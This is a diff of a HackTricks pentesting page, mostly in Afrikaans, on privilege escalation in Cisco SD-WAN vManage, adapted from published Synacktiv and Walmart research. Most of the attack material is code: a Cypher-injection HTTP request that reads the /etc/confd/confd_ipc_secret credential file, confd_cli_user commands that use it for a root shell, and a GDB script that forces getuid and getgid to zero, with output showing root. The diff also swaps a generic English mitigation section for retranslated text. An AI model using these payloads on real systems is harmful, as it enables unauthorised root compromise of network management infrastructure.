@@ -1,28 +1,31 @@
 # Cisco - vmanage
 
+{% hint style="success" %}
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou hacking-truuks deur PR's in te dien by die [hacktricks-repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud-repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## Pad 1
 
 (Voorbeeld van [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-Nadat ons 'n bietjie deur 'n paar [dokumentasie](http://66.218.245.39/doc/html/rn03re18.html) gekrap het wat verband hou met `confd` en die verskillende binnerwerke (toeganklik met 'n rekening op die Cisco-webwerf), het ons gevind dat dit 'n geheim gebruik wat in `/etc/confd/confd_ipc_secret` geleë is om die IPC-aansluiting te verifieer:
+Na 'n bietjie deur sommige [dokumentasie](http://66.218.245.39/doc/html/rn03re18.html) rakende `confd` en die verskillende binaries (toeganklik met 'n rekening op die Cisco-webwerf) te delf, het ons gevind dat om die IPC-soket te verifieer, dit 'n geheim gebruik wat geleë is in `/etc/confd/confd_ipc_secret`:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-Onthou ons Neo4j-instantie? Dit word uitgevoer onder die voorregte van die `vmanage`-gebruiker, wat ons in staat stel om die lêer te herwin deur gebruik te maak van die vorige kwesbaarheid:
+Onthou ons Neo4j-instantie? Dit loop onder die `vmanage` gebruiker se regte, wat ons in staat stel om die lêer te verkry met behulp van die vorige kwesbaarheid:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -34,7 +37,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-Die `confd_cli` program ondersteun nie opdraglyn-argumente nie, maar roep `/usr/bin/confd_cli_user` aan met argumente. So, ons kan direk `/usr/bin/confd_cli_user` oproep met ons eie stel argumente. Tog is dit nie leesbaar met ons huidige bevoegdhede nie, so ons moet dit van die rootfs herwin en dit gebruik om dit met behulp van scp te kopieer, die hulp lees en dit gebruik om die skul te kry:
+Die `confd_cli` program ondersteun nie opdraglynargumente nie, maar roep `/usr/bin/confd_cli_user` met argumente aan. So, ons kan direk `/usr/bin/confd_cli_user` met ons eie stel argumente aanroep. Dit is egter nie leesbaar met ons huidige voorregte nie, so ons moet dit van die rootfs af haal en dit met scp kopieer, die hulp lees, en dit gebruik om die shell te kry:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -52,13 +55,13 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-## Pad 2
+## Path 2
 
-(Voorbeeld van [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
+(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-Die blog¹ deur die synacktiv-span het 'n elegante manier beskryf om 'n root-skulp te kry, maar die addertjie is dat dit 'n kopie van die `/usr/bin/confd_cli_user` vereis wat slegs deur root leesbaar is. Ek het 'n ander manier gevind om na root te eskaleer sonder so 'n gedoente.
+Die blog¹ deur die synacktiv span het 'n elegante manier beskryf om 'n root shell te verkry, maar die voorwaarde is dat dit 'n kopie van die `/usr/bin/confd_cli_user` vereis wat slegs deur root leesbaar is. Ek het 'n ander manier gevind om na root te eskaleer sonder sulke moeite.
 
-Toe ek die `/usr/bin/confd_cli` binêre kode ontleed het, het ek die volgende waargeneem:
+Toe ek die `/usr/bin/confd_cli` binêre ontleed, het ek die volgende waargeneem:
 ```
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -87,20 +90,20 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-Wanneer ek "ps aux" uitvoer, het ek die volgende waargeneem (_note -g 100 -u 107_)
+Wanneer ek “ps aux” uitvoer, het ek die volgende opgemerk (_note -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Ek het vermoed dat die "confd\_cli" program die gebruikers-ID en groep-ID wat dit van die ingelogde gebruiker versamel het, aan die "cmdptywrapper" toepassing deurgee.
+Ek het hipotese dat die “confd\_cli” program die gebruikers-ID en groep-ID wat dit van die ingelogde gebruiker versamel het, aan die “cmdptywrapper” toepassing oorhandig.
 
-My eerste poging was om die "cmdptywrapper" direk uit te voer en dit te voorsien met `-g 0 -u 0`, maar dit het misluk. Dit blyk dat 'n lêerbeskrywer (-i 1015) êrens langs die pad geskep is en ek kan dit nie vervals nie.
+My eerste poging was om die “cmdptywrapper” direk te loop en dit te voorsien van `-g 0 -u 0`, maar dit het gefaal. Dit blyk dat 'n lêer beskrywer (-i 1015) êrens langs die pad geskep is en ek kan dit nie naboots nie.
 
-Soos genoem in synacktiv se blog (laaste voorbeeld), ondersteun die `confd_cli` program nie opdraglynargumente nie, maar ek kan dit beïnvloed met 'n debugger en gelukkig is GDB ingesluit op die stelsel.
+Soos genoem in synacktiv se blog (laaste voorbeeld), ondersteun die `confd_cli` program nie opdraglyn argumente nie, maar ek kan dit beïnvloed met 'n debugger en gelukkig is GDB ingesluit op die stelsel.
 
-Ek het 'n GDB-skripsie geskep waar ek die API `getuid` en `getgid` gedwing het om 0 terug te gee. Aangesien ek reeds "vmanage"-bevoegdheid het deur die deserialisering RCE, het ek toestemming om die `/etc/confd/confd_ipc_secret` direk te lees.
+Ek het 'n GDB-skrip geskep waar ek die API `getuid` en `getgid` gedwing het om 0 te retourneer. Aangesien ek reeds “vmanage” regte het deur die deserialisering RCE, het ek toestemming om die `/etc/confd/confd_ipc_secret` direk te lees.
 
 root.gdb:
 ```
@@ -120,30 +123,7 @@ root
 end
 run
 ```
-# Cisco vManage
-
-## Introduction
-
-Cisco vManage is a cloud-based network management platform that provides centralized control and visibility for Cisco SD-WAN deployments. It allows network administrators to monitor and configure network devices, troubleshoot issues, and manage network policies.
-
-## Privilege Escalation
-
-Privilege escalation refers to the process of gaining higher levels of access or privileges on a system or network. In the context of Cisco vManage, privilege escalation can allow an attacker to gain administrative access to the platform, potentially compromising the entire SD-WAN deployment.
-
-## Exploiting Vulnerabilities
-
-To escalate privileges in Cisco vManage, an attacker can exploit vulnerabilities in the platform or its underlying components. This can include exploiting misconfigurations, weak passwords, or software vulnerabilities.
-
-## Mitigation
-
-To mitigate the risk of privilege escalation in Cisco vManage, it is important to follow security best practices. This includes:
-
-- Regularly updating the platform and its components with the latest security patches.
-- Enforcing strong password policies and using multi-factor authentication.
-- Implementing network segmentation to limit the impact of a potential compromise.
-- Monitoring the platform for any suspicious activity or unauthorized access attempts.
-
-By following these best practices, organizations can reduce the risk of privilege escalation and enhance the security of their Cisco SD-WAN deployments.
+Konsoluitset:
 ```
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
@@ -177,14 +157,17 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
+{% hint style="success" %}
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou hacking-truuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
